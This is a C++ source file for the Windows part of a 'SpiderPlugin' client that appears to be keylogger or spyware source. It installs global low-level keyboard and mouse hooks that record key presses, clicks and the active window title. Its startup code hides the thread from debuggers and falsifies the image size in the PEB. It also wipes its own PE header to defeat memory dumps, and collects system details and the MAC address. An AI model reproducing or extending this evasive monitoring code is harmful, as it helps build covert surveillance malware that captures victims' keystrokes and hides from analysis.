#if defined _WIN32

#include <windows.h>
#include <array>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include "SpiderPlugin.h"
#include "MacAddr.h"

#include <iostream> // TODO: rm

namespace spider
{
namespace client
{
namespace library
{
bool SpiderPlugin::initWindows()
{
	// Hide window
	// TODO: Un-comment
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// Check if already loaded
	HANDLE hMutex = CreateMutex(NULL, FALSE, "winSp1d3r");
	if (hMutex && GetLastError() != 0)
	{
		return false;
	}

	// Hide current thread
	hideThreadWindows(GetCurrentThread());

	// Change image size, preventing from memory dump
	std::uint32_t NewSize = (std::rand() & 0x7777) + 0x100000;
	__asm {
		mov eax, fs:[0x30] // PEB
		nop
		mov eax, [eax + 0x0c] // PEB_LDR_DATA
		nop
		nop
		mov eax, [eax + 0x0c] // InOrderModuleList
		nop
		mov ecx, NewSize
		mov dword ptr[eax + 0x20], ecx // SizeOfImage
		nop
	}

	// Remove PE header
	DWORD OldProtect = 0;

	// Get base address of module
	char *pBaseAddr = (char *)GetModuleHandle(NULL);
	// Change memory protection
	// Assume x86 page size
	VirtualProtect(pBaseAddr, 0x1000, PAGE_READWRITE, &OldProtect);
	// Erase the header
	std::memset(pBaseAddr, 0, 0x1000);

	// Get informations
	getInfosWindows();

	// TODO: Get MAC address
	std::string macAddr;
	MacAddress::get(macAddr);
	std::cout << "MacAddress: " << macAddr << std::endl;

	return true;
}

bool SpiderPlugin::hideThreadWindows(void *handleThread)
{

	typedef NTSTATUS(NTAPI * pNtSetInformationThread)(HANDLE, UINT, PVOID, ULONG);
	if (!handleThread)
	{
		return false;
	}
	// Get NtSetInformationThread
	pNtSetInformationThread NtSIT = reinterpret_cast<pNtSetInformationThread>(GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtSetInformationThread"));

	// Shouldn't fail
	if (!NtSIT)
	{
		return false;
	}
	// 0x11 -> HideFromDebugger
	NTSTATUS Status = NtSIT(handleThread, 0x11, 0, 0);
	return !!Status;
}

bool SpiderPlugin::deinitWindows()
{
	system("pause");
	return false;
}

Architecture SpiderPlugin::detectArchWindows() const
{
	// Using WinAPI types
	int is64 = 0;

	// typedef for function prototype
	typedef BOOL(WINAPI * LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = reinterpret_cast<LPFN_ISWOW64PROCESS>(GetProcAddress(
		GetModuleHandle(TEXT("kernel32")), "IsWow64Process"));

	if (fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &is64))
		{
			return Architecture::BITS_UNKNOWN;
		}
	}
	return (is64) ? Architecture::BITS_64 : Architecture::BITS_32;
}

std::uint64_t SpiderPlugin::getRAMWindows() const
{
	typedef int(WINAPI * PGMSE)(LPMEMORYSTATUSEX);
	PGMSE pGMSE = reinterpret_cast<PGMSE>(GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), TEXT("GlobalMemoryStatusEx")));
	if (pGMSE)
	{
		MEMORYSTATUSEX mi;

		std::memset(&mi, 0, sizeof(MEMORYSTATUSEX));
		mi.dwLength = sizeof(MEMORYSTATUSEX);
		if (pGMSE(&mi) == TRUE)
		{
			return mi.ullTotalPhys / (1024ull * 1024ull);
		}
		pGMSE = 0;
	}
	MEMORYSTATUS mi;

	std::memset(&mi, 0, sizeof(MEMORYSTATUS));
	mi.dwLength = sizeof(MEMORYSTATUS);
	GlobalMemoryStatus(&mi);
	return mi.dwTotalPhys / (1024ull * 1024ull);
}

void SpiderPlugin::getInfosWindows()
{
	m_infos.arch = detectArchWindows();
	m_infos.os = OperatingSystem::Windows;

	SYSTEM_INFO sysInfos;
	GetNativeSystemInfo(&sysInfos);

	// Fill processor architecture informations
	switch (sysInfos.wProcessorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_AMD64:
		m_infos.pArch = ProcArchitecture::AMD64;
		break;
	case PROCESSOR_ARCHITECTURE_ARM:
		m_infos.pArch = ProcArchitecture::ARM;
		break;
	case PROCESSOR_ARCHITECTURE_IA64:
		m_infos.pArch = ProcArchitecture::IntelItanium;
		break;
	case PROCESSOR_ARCHITECTURE_INTEL:
		m_infos.pArch = ProcArchitecture::x86;
		break;
	default:
		m_infos.pArch = ProcArchitecture::Unknown;
		break;
	}
	m_infos.pageSize = sysInfos.dwPageSize;
	m_infos.nbProc = static_cast<std::uint16_t>(sysInfos.dwNumberOfProcessors);
	m_infos.ram = getRAMWindows();
}

LRESULT CALLBACK SpiderPlugin::keyboardHookWindows(int nCode, WPARAM wParam, LPARAM lParam)
{
	bool fEatKeystroke = false;

	if (nCode == HC_ACTION)
	{
		std::array<char, MAX_PATH> currentWindow;

		GetWindowTextA(GetForegroundWindow(), currentWindow.data(), sizeof(currentWindow));
		switch (wParam)
		{
		case WM_KEYDOWN:
			std::cout << "Key pressed ! [" << currentWindow.data() << "]" << std::endl;
			break;
		case WM_SYSKEYDOWN:
			break;
		case WM_KEYUP:
			break;
		case WM_SYSKEYUP:
			break;
		default:
			break;
		}
	}
	return (fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

LRESULT CALLBACK SpiderPlugin::mouseHookWindows(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		bool printPos = false;
		std::array<char, MAX_PATH> currentWindow;

		GetWindowTextA(GetForegroundWindow(), currentWindow.data(), sizeof(currentWindow));
		switch (wParam)
		{
		case WM_LBUTTONDOWN:
			std::cout << "Mouse Left Click [DOWN]";
			printPos = true;
			break;
		case WM_LBUTTONUP:
			std::cout << "Mouse Left Click [UP]";
			printPos = true;
			break;
		case WM_RBUTTONDOWN:
			std::cout << "Mouse Right Click [DOWN]";
			printPos = true;
			break;
		case WM_RBUTTONUP:
			std::cout << "Mouse Right Click [UP]";
			printPos = true;
			break;
		default:
			break;
		}
		if (printPos)
		{
			std::cout << " X: " << reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.x << " | Y: " << reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.y << "[" << currentWindow.data() << "]" << std::endl;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool SpiderPlugin::hookKeyboardWindows()
{
	// Install global hook
	m_keyboardHookWin = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookWindows, 0, 0);
	if (!m_keyboardHookWin)
	{
		return false;
	}
	return true;
}

bool SpiderPlugin::unHookKeyboardWindows()
{
	// Un-install global hook
	if (m_keyboardHookWin)
	{
		UnhookWindowsHookEx(m_keyboardHookWin);
	}
	m_keyboardHookWin = nullptr;
	return false;
}

bool SpiderPlugin::hookMouseWindows()
{
#if 1
	m_mouseHookWin = SetWindowsHookEx(WH_MOUSE_LL, mouseHookWindows, 0, 0);
	if (!m_mouseHookWin)
	{
		return false;
	}
#endif
	return true;
}

bool SpiderPlugin::unHookMouseWindows()
{
	// Un-install global hook
	if (m_keyboardHookWin)
	{
		UnhookWindowsHookEx(m_keyboardHookWin);
	}
	m_keyboardHookWin = nullptr;
	return false;
}

void SpiderPlugin::runWindows() const
{
	MSG msg;

	while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))
	{
		if (msg.message == WM_QUIT)
		{
			break;
		}
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
#if 0
	if (m_mouseHook)
	{
		POINT p;

		GetCursorPos(&p);
		std::cout << "Mouse X: " << p.x << " | Y: " << p.y << std::endl;
		if (GetAsyncKeyState(VK_LBUTTON) & 0x8000)
		{
			std::cout << "Mouse left click" << std::endl;
		}
		if (GetAsyncKeyState(VK_RBUTTON) & 0x8000)
		{
			std::cout << "Mouse right click" << std::endl;
		}
	}
#endif
}
}
}
}
#endif